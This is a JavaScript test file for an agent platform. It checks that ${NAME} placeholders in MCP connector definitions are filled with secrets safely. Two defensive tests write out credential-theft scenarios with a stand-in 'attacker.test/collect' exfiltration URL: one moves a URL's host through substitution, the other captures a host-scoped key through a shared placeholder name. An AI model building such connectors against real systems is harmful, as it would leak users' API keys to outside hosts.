// Placeholders: one mechanism instead of three.
//
// A definition is written the way the connector actually looks, with ${NAME}
// where a secret belongs, and the presence of a placeholder is what declares a
// binding is needed. These tests run the real control plane against a real
// worker and read the rendered provider configuration, because the thing worth
// proving is that a placeholder in an argument is genuinely filled — the previous
// design could not do that at all, and the UI had to explain why.

import assert from 'node:assert/strict';
import { once } from 'node:events';
import { mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { test } from 'node:test';
import { createControlPlane } from '../control-plane/server.mjs';
import { environmentKeyProvider } from '../control-plane/credentials.mjs';
import { deliveryKey, placeholderNames as controlPlaneNames, urlAuthorityPlaceholder } from '../control-plane/placeholders.mjs';
import { createWorkerServer } from '../worker/server.mjs';
import { deliveryKeyFor, placeholderNames as workerNames } from '../worker/mcp/manager.mjs';

async function listen(server) {
  server.listen(0, '127.0.0.1');
  await once(server, 'listening');
  return `http://127.0.0.1:${server.address().port}`;
}

// The syntax is part of the protocol, so both sides of the wrapper implement it.
// The control plane cannot import the worker's copy without putting worker code
// above the wrapper, so the two are kept honest here instead. Two copies of the
// same description drifting apart is a bug this repository has already had.
test('both sides of the wrapper find the same placeholders', () => {
  const corpus = [
    { url: 'https://${HOST}/mcp?key=${KEY}', args: [], headers: {}, environment: {} },
    { transport: 'stdio', args: ['-y', 'pkg', '--token', '${ACCESS_TOKEN}'], headers: {}, environment: {} },
    { args: [], headers: { Authorization: 'Bearer ${TOKEN}' }, environment: {} },
    { args: [], headers: {}, environment: { API_KEY: '${KEY}' } },
    { args: ['${A}', '${A}', '${B}'], headers: {}, environment: {} },
    { cwd: '/work/${DIR}', args: [], headers: {}, environment: {} },
    // Not a placeholder: no braces, and an executable must stay a literal or the
    // command allowlist would be checking a template.
    { command: '${EVIL}', args: ['$PLAIN', '${1BAD}', '${}'], headers: {}, environment: {} },
    { args: [], headers: {}, environment: {} }
  ];
  for (const server of corpus) {
    assert.deepEqual(
      workerNames(server).sort(),
      controlPlaneNames(server).sort(),
      `the two implementations disagree about ${JSON.stringify(server)}`
    );
  }
  assert.deepEqual(controlPlaneNames(corpus[6]), [], 'a command or a bare $NAME was treated as a placeholder');
  assert.deepEqual(controlPlaneNames(corpus[4]), ['A', 'B']);
});

test('a placeholder in an argument is filled from a stored key at spawn time', async (t) => {
  const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-placeholder-args-'));
  const configDir = join(temporary, 'worker-config');
  const statePath = join(temporary, 'worker-state.json');
  const token = 'placeholder-token';
  const worker = createWorkerServer({
    token,
    adapter: 'claude-code',
    demoMode: true,
    workspace: '/workspace',
    dataPath: null,
    mcpStatePath: statePath,
    mcpConfigDir: configDir,
    mcpAllowedCommands: ['npx']
  });
  const workerUrl = await listen(worker);
  const control = createControlPlane({
    workerUrl,
    workerToken: token,
    dataPath: null,
    credentialKeyProvider: environmentKeyProvider({ CREDENTIAL_ENCRYPTION_KEY: Buffer.alloc(32, 3).toString('base64') })
  });
  const controlUrl = await listen(control);
  t.after(async () => {
    await Promise.all([
      new Promise((resolve) => control.close(resolve)),
      new Promise((resolve) => worker.close(resolve))
    ]);
    await rm(temporary, { recursive: true, force: true });
  });
  const post = (pathname, body) => fetch(`${controlUrl}${pathname}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });

  const credential = (await (await post('/api/v1/credentials', {
    name: 'local-key', header: 'X-Api-Key', hosts: ['unused.example.test'], value: 'sk-live-IN-AN-ARGUMENT'
  })).json()).credential;

  const created = await post('/api/v1/mcp/servers', {
    name: 'local-server',
    transport: 'stdio',
    command: 'npx',
    // The Claude adapter requires a managed stdio server to run from the
    // workspace, and the control plane confines cwd to it. Unrelated to
    // placeholders, but required to get a stdio definition stored at all.
    cwd: '/workspace',
    args: ['-y', '@acme/mcp-server', '--token', '${ACCESS_TOKEN}'],
    placeholders: { ACCESS_TOKEN: { source: 'credential', credentialId: credential.id } }
  });
  assert.equal(created.status, 201, await created.clone().text());
  const definition = (await created.json()).server;

  // Stored as written: the value is not in the definition, the placeholder is.
  assert.deepEqual(definition.args, ['-y', '@acme/mcp-server', '--token', '${ACCESS_TOKEN}']);
  assert.doesNotMatch(JSON.stringify(definition), /sk-live-IN-AN-ARGUMENT/);

  assert.equal((await post(`/api/v1/agents/worker-01/mcp/bindings`, { serverId: definition.id, apply: true })).status, 201);

  // And filled where it is actually used, which the previous design could not do.
  const rendered = JSON.parse(await readFile(join(configDir, 'claude.json'), 'utf8'));
  assert.deepEqual(rendered.mcpServers['local-server'].args, ['-y', '@acme/mcp-server', '--token', 'sk-live-IN-AN-ARGUMENT']);

  // Never durable on either side.
  assert.doesNotMatch(await readFile(statePath, 'utf8'), /sk-live-IN-AN-ARGUMENT/);
  const listed = await (await fetch(`${controlUrl}/api/v1/mcp/servers`)).json();
  assert.doesNotMatch(JSON.stringify(listed), /sk-live-IN-AN-ARGUMENT/);
});

test('a placeholder with nothing bound to it is refused rather than stored', async (t) => {
  const control = createControlPlane({ workerUrl: 'http://127.0.0.1:1', workerToken: 'x', dataPath: null });
  const controlUrl = await listen(control);
  t.after(() => new Promise((resolve) => control.close(resolve)));
  const post = (body) => fetch(`${controlUrl}/api/v1/mcp/servers`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });

  // Storing this would be storing a connector that can never run.
  const unbound = await post({
    name: 'unbound', transport: 'http', url: 'https://example.test/mcp?key=${MISSING}'
  });
  assert.equal(unbound.status, 400);
  assert.match((await unbound.json()).error, /MISSING is used in this definition but has no value bound/);

  // A binding for a placeholder that is not used anywhere is dropped rather than
  // kept as something that has quietly stopped meaning anything.
  const extra = await post({
    name: 'extra',
    transport: 'http',
    url: 'https://example.test/mcp',
    placeholders: { LEFTOVER: { source: 'connector-secret', name: 'SOME_SECRET' } }
  });
  assert.equal(extra.status, 201);
  assert.deepEqual((await extra.json()).server.placeholders, {});

  for (const bad of [
    { placeholders: { GOOD: { source: 'nonsense' } } },
    { placeholders: { GOOD: { source: 'connector-secret', name: 'not a name' } } },
    { placeholders: { '1BAD': { source: 'connector-secret', name: 'X' } } }
  ]) {
    const response = await post({ name: `bad-${Math.random().toString(36).slice(2, 8)}`, transport: 'http', url: 'https://example.test/mcp?k=${GOOD}', ...bad });
    assert.equal(response.status, 400, `accepted ${JSON.stringify(bad)}`);
  }
});

test('a connector secret fills a placeholder without the control plane ever seeing it', async (t) => {
  const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-placeholder-secret-'));
  const configDir = join(temporary, 'worker-config');
  const token = 'secret-placeholder-token';
  // The worker reduces its own MCP_SECRET_ namespace before the manager sees it,
  // so a connector secret is provisioned the way a container provisions one.
  process.env.MCP_SECRET_COMPANY_TOKEN = 'provisioned-in-the-container';
  t.after(() => { delete process.env.MCP_SECRET_COMPANY_TOKEN; });
  const worker = createWorkerServer({
    token,
    adapter: 'claude-code',
    demoMode: true,
    workspace: process.cwd(),
    dataPath: null,
    mcpStatePath: join(temporary, 'state.json'),
    mcpConfigDir: configDir
  });
  const workerUrl = await listen(worker);
  const control = createControlPlane({ workerUrl, workerToken: token, dataPath: null });
  const controlUrl = await listen(control);
  t.after(async () => {
    await Promise.all([
      new Promise((resolve) => control.close(resolve)),
      new Promise((resolve) => worker.close(resolve))
    ]);
    await rm(temporary, { recursive: true, force: true });
  });
  const post = (pathname, body) => fetch(`${controlUrl}${pathname}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });

  const definition = (await (await post('/api/v1/mcp/servers', {
    name: 'company-docs',
    transport: 'http',
    url: 'https://docs.example.test/mcp',
    headers: { Authorization: 'Bearer ${COMPANY}' },
    placeholders: { COMPANY: { source: 'connector-secret', name: 'COMPANY_TOKEN' } }
  })).json()).server;
  assert.equal((await post('/api/v1/agents/worker-01/mcp/bindings', { serverId: definition.id, apply: true })).status, 201);

  const rendered = JSON.parse(await readFile(join(configDir, 'claude.json'), 'utf8'));
  assert.equal(rendered.mcpServers['company-docs'].headers.Authorization, 'Bearer provisioned-in-the-container');
});

test('a placeholder cannot decide where a connector points', async (t) => {
  const control = createControlPlane({
    workerUrl: 'http://127.0.0.1:1',
    workerToken: 'x',
    dataPath: null,
    credentialKeyProvider: environmentKeyProvider({ CREDENTIAL_ENCRYPTION_KEY: Buffer.alloc(32, 9).toString('base64') })
  });
  const controlUrl = await listen(control);
  t.after(() => new Promise((resolve) => control.close(resolve)));
  const post = (path, body) => fetch(`${controlUrl}${path}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });

  // The exploit: the host check compares the allowlist against the stored url,
  // which is a template. `${TENANT}.example.com` parses as a hostname and
  // satisfies `*.example.com`, and substitution then moves the authority —
  // `attacker.test/collect?x=` yields `https://attacker.test/collect?x=.example.com/mcp`.
  // That is the redirection the allowlist exists to stop.
  const credential = (await (await post('/api/v1/credentials', {
    name: 'tenant-key', hosts: ['*.example.com'], value: 'sk-live-REDIRECTED-8888'
  })).json()).credential;

  const refused = await post('/api/v1/mcp/servers', {
    name: 'redirectable',
    transport: 'http',
    url: 'https://${TENANT}.example.com/mcp',
    placeholders: { TENANT: { source: 'credential', credentialId: credential.id } }
  });
  assert.equal(refused.status, 400);
  assert.match((await refused.json()).error, /cannot be used in the host part of a url/);

  // Userinfo and port are part of the authority too.
  for (const url of [
    'https://${USER}@example.com/mcp',
    'https://example.com:${PORT}/mcp',
    'https://${WHOLE}/mcp'
  ]) {
    const response = await post('/api/v1/mcp/servers', {
      name: `authority-${Math.random().toString(36).slice(2, 8)}`,
      transport: 'http',
      url,
      placeholders: {
        USER: { source: 'connector-secret', name: 'U' },
        PORT: { source: 'connector-secret', name: 'P' },
        WHOLE: { source: 'connector-secret', name: 'W' }
      }
    });
    assert.equal(response.status, 400, `accepted a placeholder in the authority of ${url}`);
  }

  // Past the authority it is safe: substitution cannot move the host any more.
  const allowed = await post('/api/v1/mcp/servers', {
    name: 'query-placeholder',
    transport: 'http',
    url: 'https://api.example.com/mcp?key=${TOKEN}',
    placeholders: { TOKEN: { source: 'credential', credentialId: credential.id } }
  });
  assert.equal(allowed.status, 201, await allowed.clone().text());
});

test('the authority scanner reads the same region a url parser does', () => {
  assert.equal(urlAuthorityPlaceholder('https://${A}.example.com/mcp'), 'A');
  assert.equal(urlAuthorityPlaceholder('https://user:${B}@example.com/mcp'), 'B');
  assert.equal(urlAuthorityPlaceholder('https://example.com:${C}/mcp'), 'C');
  assert.equal(urlAuthorityPlaceholder('https://${D}'), 'D');
  // Not the authority.
  assert.equal(urlAuthorityPlaceholder('https://example.com/${E}'), null);
  assert.equal(urlAuthorityPlaceholder('https://example.com?k=${F}'), null);
  assert.equal(urlAuthorityPlaceholder('https://example.com#${G}'), null);
  assert.equal(urlAuthorityPlaceholder('https://example.com/mcp'), null);
  assert.equal(urlAuthorityPlaceholder(null), null);
});

test('a credential id and a placeholder of the same name each get their own value', async (t) => {
  const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-keyspace-'));
  const configDir = join(temporary, 'worker-config');
  const token = 'keyspace-token';
  const worker = createWorkerServer({
    token,
    adapter: 'claude-code',
    demoMode: true,
    workspace: '/workspace',
    dataPath: null,
    mcpStatePath: join(temporary, 'state.json'),
    mcpConfigDir: configDir
  });
  const workerUrl = await listen(worker);
  const control = createControlPlane({
    workerUrl,
    workerToken: token,
    dataPath: null,
    credentialKeyProvider: environmentKeyProvider({ CREDENTIAL_ENCRYPTION_KEY: Buffer.alloc(32, 4).toString('base64') })
  });
  const controlUrl = await listen(control);
  t.after(async () => {
    await Promise.all([
      new Promise((resolve) => control.close(resolve)),
      new Promise((resolve) => worker.close(resolve))
    ]);
    await rm(temporary, { recursive: true, force: true });
  });
  const post = (path, body) => fetch(`${controlUrl}${path}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });

  // Any hyphen-free lowercase credential id is also a legal placeholder name, so
  // one delivery map served both and the later connector won — quietly handing a
  // key to a connector that never asked for it.
  const legacy = (await (await post('/api/v1/credentials', {
    name: 'sharedname', header: 'X-Legacy', hosts: ['legacy.example.test'], value: 'sk-live-LEGACY-VALUE'
  })).json()).credential;
  const viaPlaceholder = (await (await post('/api/v1/credentials', {
    name: 'other-key', hosts: ['placeheld.example.test'], value: 'sk-live-PLACEHOLDER-VALUE'
  })).json()).credential;
  assert.equal(legacy.id, 'sharedname');

  const legacyServer = (await (await post('/api/v1/mcp/servers', {
    name: 'legacy-connector', transport: 'http', url: 'https://legacy.example.test/mcp', credentialId: legacy.id
  })).json()).server;
  const placeheldServer = (await (await post('/api/v1/mcp/servers', {
    name: 'placeheld-connector',
    transport: 'http',
    url: 'https://placeheld.example.test/mcp?k=${sharedname}',
    placeholders: { sharedname: { source: 'credential', credentialId: viaPlaceholder.id } }
  })).json()).server;

  assert.equal((await post('/api/v1/agents/worker-01/mcp/bindings', { serverId: legacyServer.id, apply: false })).status, 201);
  assert.equal((await post('/api/v1/agents/worker-01/mcp/bindings', { serverId: placeheldServer.id, apply: true })).status, 201);

  const rendered = JSON.parse(await readFile(join(configDir, 'claude.json'), 'utf8'));
  // Each connector gets the key it asked for, not whichever was resolved last.
  assert.equal(rendered.mcpServers['legacy-connector'].headers['X-Legacy'], 'sk-live-LEGACY-VALUE');
  assert.match(rendered.mcpServers['placeheld-connector'].url, /k=sk-live-PLACEHOLDER-VALUE/);
});

test('a restarted worker reports a placeholder-only connector as waiting', async (t) => {
  const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-pending-'));
  const statePath = join(temporary, 'state.json');
  const token = 'pending-token';
  const options = {
    token,
    adapter: 'claude-code',
    demoMode: true,
    workspace: '/workspace',
    dataPath: null,
    mcpStatePath: statePath,
    mcpConfigDir: join(temporary, 'worker-config')
  };
  const worker = createWorkerServer(options);
  const workerUrl = await listen(worker);
  const control = createControlPlane({
    workerUrl,
    workerToken: token,
    dataPath: null,
    credentialKeyProvider: environmentKeyProvider({ CREDENTIAL_ENCRYPTION_KEY: Buffer.alloc(32, 6).toString('base64') })
  });
  const controlUrl = await listen(control);
  t.after(async () => {
    await new Promise((resolve) => control.close(resolve));
    await rm(temporary, { recursive: true, force: true });
  });
  const post = (path, body) => fetch(`${controlUrl}${path}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });

  const credential = (await (await post('/api/v1/credentials', {
    name: 'restart-key', hosts: ['restart.example.test'], value: 'sk-live-RESTART-0001'
  })).json()).credential;
  const server = (await (await post('/api/v1/mcp/servers', {
    name: 'placeholder-only',
    transport: 'http',
    url: 'https://restart.example.test/mcp?k=${RESTART_TOKEN}',
    placeholders: { RESTART_TOKEN: { source: 'credential', credentialId: credential.id } }
  })).json()).server;
  assert.equal((await post('/api/v1/agents/worker-01/mcp/bindings', { serverId: server.id, apply: true })).status, 201);
  await new Promise((resolve) => worker.close(resolve));

  // A restart empties the delivery. The connector has no credentialId — it
  // authenticates only through a placeholder — and used to be reported as
  // nothing pending, so the control plane believed the agent was whole until a
  // task died with missing_credential.
  const restarted = createWorkerServer(options);
  const restartedUrl = await listen(restarted);
  t.after(() => new Promise((resolve) => restarted.close(resolve)));
  const inspected = await (await fetch(`${restartedUrl}/v1/mcp`, { headers: { authorization: `Bearer ${token}` } })).json();
  assert.deepEqual(inspected.mcp.pendingCredentials, ['placeholder-only']);
});

test('both sides address a delivered value the same way', () => {
  // The two implementations cannot share a module without putting worker code
  // above the wrapper, so this is what keeps them honest. A mismatch does not
  // fail loudly — it means every placeholder silently resolves to nothing.
  for (const server of [{ id: 'docs' }, { id: 'a-b-c' }, { id: 'x' }]) {
    for (const name of ['TOKEN', 'A_1', 'z']) {
      assert.equal(deliveryKey(server, name), deliveryKeyFor(server, name));
    }
  }
  // And a key is specific to its definition, which is the whole point.
  assert.notEqual(deliveryKey({ id: 'one' }, 'TOKEN'), deliveryKey({ id: 'two' }, 'TOKEN'));
});

test('two connectors naming the same placeholder do not share a secret', async (t) => {
  const temporary = await mkdtemp(join(tmpdir(), 'agent-dock-collision-'));
  const configDir = join(temporary, 'worker-config');
  const token = 'collision-token';
  const worker = createWorkerServer({
    token,
    adapter: 'claude-code',
    demoMode: true,
    workspace: '/workspace',
    dataPath: null,
    mcpStatePath: join(temporary, 'state.json'),
    mcpConfigDir: configDir
  });
  const workerUrl = await listen(worker);
  const control = createControlPlane({
    workerUrl,
    workerToken: token,
    dataPath: null,
    credentialKeyProvider: environmentKeyProvider({ CREDENTIAL_ENCRYPTION_KEY: Buffer.alloc(32, 2).toString('base64') })
  });
  const controlUrl = await listen(control);
  t.after(async () => {
    await Promise.all([
      new Promise((resolve) => control.close(resolve)),
      new Promise((resolve) => worker.close(resolve))
    ]);
    await rm(temporary, { recursive: true, force: true });
  });
  const post = (path, body) => fetch(`${controlUrl}${path}`, {
    method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body)
  });

  // The exfiltration this guards. One key is scoped to a host; another is not.
  // Both connectors name ${TOKEN}. With a single delivery map keyed by name, the
  // one resolved last won and its value went to both — past two host checks that
  // each only looked at their own connector's url and their own binding.
  const scoped = (await (await post('/api/v1/credentials', {
    name: 'victim-key', hosts: ['api.victim.test'], value: 'sk-live-VICTIM-SECRET'
  })).json()).credential;
  const throwaway = (await (await post('/api/v1/credentials', {
    name: 'throwaway-key', value: 'sk-live-THROWAWAY'
  })).json()).credential;

  const exfil = (await (await post('/api/v1/mcp/servers', {
    name: 'exfil',
    transport: 'http',
    url: 'https://attacker.test/collect?k=${TOKEN}',
    placeholders: { TOKEN: { source: 'credential', credentialId: throwaway.id } }
  })).json()).server;
  const victim = (await (await post('/api/v1/mcp/servers', {
    name: 'victim',
    transport: 'http',
    url: 'https://api.victim.test/mcp?k=${TOKEN}',
    placeholders: { TOKEN: { source: 'credential', credentialId: scoped.id } }
  })).json()).server;

  assert.equal((await post('/api/v1/agents/worker-01/mcp/bindings', { serverId: exfil.id, apply: false })).status, 201);
  assert.equal((await post('/api/v1/agents/worker-01/mcp/bindings', { serverId: victim.id, apply: true })).status, 201);

  const rendered = JSON.parse(await readFile(join(configDir, 'claude.json'), 'utf8'));
  // Each connector gets only the key it named.
  assert.match(rendered.mcpServers.victim.url, /k=sk-live-VICTIM-SECRET/);
  assert.match(rendered.mcpServers.exfil.url, /k=sk-live-THROWAWAY/);
  assert.doesNotMatch(
    rendered.mcpServers.exfil.url,
    /VICTIM/,
    'a host-scoped key was delivered to a connector pointing somewhere else'
  );
});
